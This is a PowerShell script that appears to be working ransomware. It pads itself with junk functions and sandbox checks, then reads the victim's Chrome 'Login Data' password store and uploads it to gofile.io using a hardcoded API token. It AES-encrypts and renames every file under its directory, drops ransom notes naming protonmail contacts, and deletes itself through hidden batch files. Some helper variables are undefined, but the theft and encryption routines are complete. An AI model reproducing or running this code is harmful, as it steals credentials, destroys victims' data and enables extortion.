#requires -Version 5.1

function gHjKlMnP {
    param([int]$Length = 12)
    $chars = ([char[]](65..90 + 97..122 + 48..57))
    -join (1..$Length | ForEach-Object { $chars | Get-Random })
}

function zXcVbNmQ {
    param([string]$ext = 'tmp')
    $temp = $env:TEMP
    $name = gHjKlMnP -Length 8
    return Join-Path $temp ("tmp_$name.$ext")
}

function qzvJkLm {
    $a1 = Get-Random -Minimum 1000 -Maximum 9999
    if ($a1 -eq 123456789) { exit }
    $b2 = zXcVbNmQ
    if ($b2 -match 'never_gonna_happen') { exit }
    $c3 = [System.Diagnostics.Process]::GetProcesses() | Where-Object { $_.ProcessName -like '*sandbox*' }
    if ($c3.Count -gt 1000) { exit }
    $d4 = [System.Environment]::TickCount
    if ($d4 -eq -1) { exit }
    return $a1 + $d4
}
function xwqPlOk {
    try { throw ([char[]](65..90+97..122+48..57) | Get-Random -Count 12 -join '') } catch { }
    if ($env:USERNAME -eq 'virus') { exit }
    if ([System.Diagnostics.Process]::GetProcessesByName('vboxservice').Length -gt 100) { exit }
    Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 50)
}
function mnbTyuVcx {
    $e5 = [DateTime]::Now.DayOfWeek
    if ($e5 -eq 'Funday') { exit }
    $f6 = gHjKlMnP -Length 12
    if ($f6 -eq 'this_file_does_not_exist') { exit }
    $g7 = (Get-Random -Minimum 1 -Maximum 10000)
    if ($g7 -eq 77777) { exit }
}
function lkjHgfdSa {
    $h8 = [System.Guid]::NewGuid().ToString()
    if ($h8 -eq '00000000-0000-0000-0000-000000000000') { exit }
    $i9 = [System.IO.Directory]::GetCurrentDirectory()
    if ($i9 -eq 'C:\Never\Gonna\Give\You\Up') { exit }
    $j0 = (Get-ChildItem -Path $env:TEMP | Measure-Object).Count
    if ($j0 -gt 99999) { exit }
}
function asdQweZxc {
    Write-Host "hello"
    qzvJkLm | Out-Null
    xwqPlOk
    mnbTyuVcx
    lkjHgfdSa
    if ((Get-Random -Minimum 100000 -Maximum 200000) -eq 150000) { exit }
    if ([System.Environment]::MachineName -eq 'FAKEVM') { exit }
    if ($env:PROCESSOR_ARCHITECTURE -eq 'FAKE') { exit }
    if (([System.DateTime]::Now.Year) -eq 1900) { exit }
}
asdQweZxc


$rTg8YhUj = [byte[]](1..256 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 })
$wQe4RtYu = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($rTg8YhUj.Length)
[System.Runtime.InteropServices.Marshal]::Copy($rTg8YhUj, 0, $wQe4RtYu, $rTg8YhUj.Length)
$pLo9KiJm = Add-Type -MemberDefinition @"
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
    public static int DummyMethod(int a, int b) { return a + b; }
"@ -Name "DummyAPI" -Namespace "FakeNS" -PassThru
$vBn7UjMi = [FakeNS.DummyAPI]::GetCurrentProcess()
$cXz6ZaQw = [FakeNS.DummyAPI]::DummyMethod((Get-Random -Minimum 1 -Maximum 100), (Get-Random -Minimum 1 -Maximum 100))
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($wQe4RtYu)


function axbdzh($iN){
    try {
        if ([string]::IsNullOrEmpty($iN)) { return "" }
        $cL = $iN -replace '[^A-Za-z0-9+/=]',''
        if ($cL.Length % 4 -ne 0) { return "" }
        $b = [System.Convert]::FromBase64String($cL)
        return [System.Text.Encoding]::UTF8.GetString($b)
    } catch {
        return ""
    }
}
function dUmMy1{param($x) $x*2-($x/2)}
function dUmMy2{Get-Date|Out-Null}

$A=axbdzh('ZERTQ0oxahpZcEQ4ODRBNUp5MWlOem1iNGV6SGpKdFJh!!ESION!!')
$B=axbdzh('ZDUyNTQ1YmQtZTk5Zi00ODNlLTgzOTctYTVkYzA5ZDZjMjdl!!ESION!!')

function f1{param($a) $b=@({param($x)$x*2/2},{param($x)$x+5-5},{param($x)[Math]::Sin([Math]::PI)*$x});$c=$b|Get-Random;&$c $a}
function f2{$a=Get-Random -Minimum 32 -Maximum 128;$b=New-Object byte[] $a;[System.Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes($b);return $b}
function f3{$a=@();1..(Get-Random -Minimum 2 -Maximum 5)|%{$b=@();1..(Get-Random -Minimum 2 -Maximum 5)|%{$b+=Get-Random -Minimum 1 -Maximum 100};$a+=,$b};return $a}
function f4{param($a)$b=[System.Security.Cryptography.MD5]::Create();$c=$b.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($a));$b.Dispose();return $c}
function f5{param($a)try{$b=f4($a);$c=f1(Get-Random -Minimum 100 -Maximum 1000);$d=[Convert]::FromBase64String($a);$e=[System.Text.Encoding]::UTF8.GetString($d);return $e}catch{return ''}finally{[System.GC]::Collect()}}
function f6($a,$b){$c='';$d=$b.Length;for($e=0;$e -lt $a.Length;$e++){$c+=[char]([byte][char]$a[$e]-bxor[byte][char]$b[$e%$d])};return $c}
function f7($a){return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))}

$C=$env:USERNAME
$D="C:\Users\$C\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if(Test-Path $D){try{$E=f5(f6(f7($urlA),$zw132));$F="$E$(f5(f6(f7($endpoints['cf']),$zw132)))";$G=@{token=$A;parentFolderId=$B;folderName=$C};$H=Invoke-RestMethod -Uri $F -Method Post -Body $G;if($H.status -ne 'ok'){}$I=$H.data.id;$J="$(f5(f6(f7($urlB),$zw132)))$(f5(f6(f7($endpoints['uf']),$zw132)))";$K=[System.Guid]::NewGuid().ToString();$L="`r`n";$M=[System.IO.File]::ReadAllBytes($D);$N=[System.IO.Path]::GetFileName($D);$O=@();$O+="--$K";$O+="Content-Disposition: form-data; name=`"token`"$L";$O+=$A;$O+="--$K";$O+="Content-Disposition: form-data; name=`"folderId`"$L";$O+=$I;$O+="--$K";$O+="Content-Disposition: form-data; name=`"file`"; filename=`"$N`"$L"+"Content-Type: application/octet-stream$L";$P=[System.Text.Encoding]::UTF8.GetBytes(($O-join$L)+$L);$Q=[System.Text.Encoding]::UTF8.GetBytes("$L--$K--$L");$R=New-Object byte[] ($P.Length+$M.Length+$Q.Length);[Array]::Copy($P,0,$R,0,$P.Length);[Array]::Copy($M,0,$R,$P.Length,$M.Length);[Array]::Copy($Q,0,$R,$P.Length+$M.Length,$Q.Length);$S=New-Object System.Net.WebClient;$S.Headers.Add("Content-Type","multipart/form-data; boundary=$K");try{$T=$S.UploadData($J,"POST",$R);$uploadResp=[System.Text.Encoding]::UTF8.GetString($T)}catch{}}catch{}}else{}

function bnmqazwsx {
    $x1 = @()
    1..(Get-Random -Minimum 5 -Maximum 15) | ForEach-Object {
        $x1 += yhnujmikol (Get-Random -Minimum 3 -Maximum 8)
    }
    return $x1
}

function cvbnmlkjhg {
    param($y1)
    $y2 = $y1
    for($y3=0; $y3 -lt (Get-Random -Minimum 3 -Maximum 8); $y3++) {
        $y2 = $y2 * (Get-Random -Minimum 2 -Maximum 5)
        $y2 = $y2 / (Get-Random -Minimum 2 -Maximum 5)
    }
    return $y2
}

function yhnujmikol {
    param($z1=10)
    -join ((65..90)+(97..122) | Get-Random -Count $z1 | ForEach-Object {[char]$_})
}

$aa = "d067f175-fbae-4914-b118-ba2b8852393f"
try {
    $ab = f5(f6(f7($urlA), $zw132))
    $ac = "$ab$(f5(f6(f7($endpoints['gc']), $zw132)))"
    $ad = @{
        contentId = $aa
        token = $A
    }
    $ae = Invoke-RestMethod -Uri $ac -Method Get -Body $ad
    if($ae.status -eq 'ok') {
        $af = $ae.data.contents.PSObject.Properties | Where-Object { $_.Value.name -eq "Key.txt" } | Select-Object -ExpandProperty Name
        if($af) {
            $ag = Get-GoFileContent $af
            if(!$ag) {
                $ag = 'UDFLNEFIMUxMQ1lCM1I='
            }
        }
    }
} catch {
    $ag = 'UDFLNEFIMUxMQ1lCM1I='
}

$ah = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ag))

function ujmnhytgbv {
    param($ai)
    $aj = cvbnmlkjhg (Get-Random -Minimum 100 -Maximum 1000)
    $ak = [System.Security.Cryptography.SHA256]::Create()
    $al = [System.Text.Encoding]::UTF8.GetBytes($ai)
    $am = $ak.ComputeHash($al)
    $ak.Dispose()
    return $am
}

function ikmjnhytgb {
    param($an=12)
    $ao = bnmqazwsx
    -join ((65..90)+(97..122)+(48..57) | Get-Random -Count $an | ForEach-Object {[char]$_})
}

function olpknmijuh {
    param($ap=3)
    $aq = cvbnmlkjhg (Get-Random -Minimum 1 -Maximum 10)
    -join ((97..122) | Get-Random -Count $ap | ForEach-Object {[char]$_})
}

function plokmijnuh {
    param($ar, $as)
    $at = bnmqazwsx
    $au = [System.Security.Cryptography.Aes]::Create()
    $au.Key = $as
    $au.Mode = 'CBC'
    $au.Padding = 'PKCS7'
    $au.GenerateIV()
    $av = $au.IV
    $aw = [System.Text.Encoding]::UTF8.GetBytes((yhnujmikol 100))
    $ax = ujmnhytgbv (yhnujmikol 50)
    $ay = $au.CreateEncryptor()
    $az = [System.IO.File]::ReadAllBytes($ar)
    $ba = @()
    1..(Get-Random -Minimum 3 -Maximum 8) | ForEach-Object {
        $ba += cvbnmlkjhg $_
    }
    $bb = $ay.TransformFinalBlock($az, 0, $az.Length)
    $bc = $av + $bb
    [System.IO.File]::WriteAllBytes($ar, $bc)
    $au.Dispose()
}

$bd = if ($PSCommandPath) { $PSCommandPath } else { [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName }

Set-Content -Path "README.txt" -Value @"
!!! IMPORTANT - YOUR FILES HAVE BEEN ENCRYPTED !!!

Contact us at: ran@protonmail.com

WARNING:
- DO NOT try to decrypt your files using third party software, it may cause permanent data loss
- DO NOT rename encrypted files
- DO NOT modify encrypted files
"@ -Encoding UTF8

$be = ujmnhytgbv $ah
$bf = Get-ChildItem -Recurse -File | Where-Object { $_.Name -ne 'ransomeware.ps1' -and $_.Name -ne 'README.txt' }
foreach ($bg in $bf) {
    $bh = ikmjnhytgb
    $bi = olpknmijuh
    $bj = Join-Path $bg.Directory.FullName "$bh.$bi"
    try {
        plokmijnuh $bg.FullName $be
        Rename-Item $bg.FullName $bj -ErrorAction Stop
    } catch {}
}

if ($bd -like '*.exe') {
    $bk = zXcVbNmQ 'ps1'
    $bl = @'
Clear-Host
$bm = @"

    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    █                                                                    █
    █                 !!! YOUR FILES HAVE BEEN ENCRYPTED !!!             █
    █                                                                    █
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀

    ⚠ WHAT HAPPENED TO YOUR FILES?
    All of your files have been encrypted with military-grade encryption.
    You cannot access them without the decryption key.

    ⚠ HOW TO RECOVER YOUR FILES?

    Contact: ransm@protonmail.com

    ⚠ WARNING! 
    DO NOT attempt to decrypt files yourself - this will result in permanent data loss!
    DO NOT delete or rename encrypted files!
    DO NOT ignore this message - your files will be lost forever!

    THE ONLY WAY TO RECOVER YOUR FILES IS TO PAY THE RANSOM! 
    Press Enter to exit...
"@
Write-Host $bm -ForegroundColor Red
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
'@
    Set-Content -Path $bk -Value $bl -Encoding UTF8
    Start-Process powershell -ArgumentList "-NoExit", "-ExecutionPolicy Bypass", "-File", $bk
    try {
        $bm1 = Join-Path $env:TEMP (ikmjnhytgb + ".exe")
        Copy-Item $bd $bm1 -Force
        $bm2 = zXcVbNmQ 'bat'
@"
@echo off
start "" /b "$bm1"
timeout /t 1 /nobreak >nul
del /f "$bd"
del /f "%~f0"
"@ | Set-Content -Path $bm2 -Encoding ASCII
        Start-Process cmd -ArgumentList "/c $bm2" -WindowStyle Hidden
        exit
    } catch {
        $bm3 = zXcVbNmQ 'bat'
@"
@echo off
:check
timeout /t 2 /nobreak >nul
del /f "$bd" 2>nul
if exist "$bd" goto check
del /f "%~f0"
"@ | Set-Content -Path $bm3 -Encoding ASCII
        Start-Process cmd -ArgumentList "/c $bm3" -WindowStyle Hidden
    }
    $bm4 = Join-Path (Split-Path $bd) 'ran.rar'
    if (Test-Path $bm4) { 
        Remove-Item $bm4 -Force 
    }
} else {
    try {
        plokmijnuh $bd (ujmnhytgbv $ah)
        Remove-Item $bd -Force -ErrorAction SilentlyContinue
    } catch {
        Remove-Item $bd -Force -ErrorAction SilentlyContinue
    }
}

$kz9qW3n = 'dDJ1hzYpBD884A5Jy1iNzmb4ezHjJtRa'
$r7mP8vT = 'd52545bd-e99f-483e-8397-a5dc09d6c27e'
$x4bL2cY = $env:USERNAME
$y6nF5tR = "C:\Users\$x4bL2cY\AppData\Local\Google\Chrome\User Data\Default\Login Data"
if (!(Test-Path $y6nF5tR)) {
    $y6nF5tR = "C:\Users\$x4bL2cY\Documents\test.txt"
    if (!(Test-Path $y6nF5tR)) {
        Set-Content -Path $y6nF5tR -Value "Test upload from PowerShell" -Encoding UTF8
    }
}
try {
    $p3qX9wE = "https://api.gofile.io/contents/createFolder"
    $t8mJ4kN = @{
        token = $kz9qW3n
        parentFolderId = $r7mP8vT
        folderName = $x4bL2cY
    }
    $z2vC7hU = Invoke-RestMethod -Uri $p3qX9wE -Method Post -Body $t8mJ4kN
    $q5rB1mP = $z2vC7hU.data.id
    $w9xT3fL = "https://upload.gofile.io/uploadFile"
    $e6jY8nQ = [System.Guid]::NewGuid().ToString()
    $i2kM4vB = "`r`n"
    $a7pZ5cX = [System.IO.File]::ReadAllBytes($y6nF5tR)
    $o3lR9tW = [System.IO.Path]::GetFileName($y6nF5tR)
    $u1hF6mK = @()
    $u1hF6mK += "--$e6jY8nQ"
    $u1hF6mK += "Content-Disposition: form-data; name=`"token`"$i2kM4vB"
    $u1hF6mK += $kz9qW3n
    $u1hF6mK += "--$e6jY8nQ"
    $u1hF6mK += "Content-Disposition: form-data; name=`"folderId`"$i2kM4vB"
    $u1hF6mK += $q5rB1mP
    $u1hF6mK += "--$e6jY8nQ"
    $u1hF6mK += "Content-Disposition: form-data; name=`"file`"; filename=`"$o3lR9tW`"$i2kM4vB" + "Content-Type: application/octet-stream$i2kM4vB"
    $s4gN2bV = [System.Text.Encoding]::UTF8.GetBytes(($u1hF6mK -join $i2kM4vB) + $i2kM4vB)
    $d8cW7yT = [System.Text.Encoding]::UTF8.GetBytes("$i2kM4vB--$e6jY8nQ--$i2kM4vB")
    $n5vJ1rQ = New-Object byte[] ($s4gN2bV.Length + $a7pZ5cX.Length + $d8cW7yT.Length)
    [Array]::Copy($s4gN2bV, 0, $n5vJ1rQ, 0, $s4gN2bV.Length)
    [Array]::Copy($a7pZ5cX, 0, $n5vJ1rQ, $s4gN2bV.Length, $a7pZ5cX.Length)
    [Array]::Copy($d8cW7yT, 0, $n5vJ1rQ, $s4gN2bV.Length + $a7pZ5cX.Length, $d8cW7yT.Length)
    $m2tL6fR = New-Object System.Net.WebClient
    $m2tL6fR.Headers.Add("Content-Type", "multipart/form-data; boundary=$e6jY8nQ")
    $b9kP4xZ = $m2tL6fR.UploadData($w9xT3fL, "POST", $n5vJ1rQ)
} catch {  }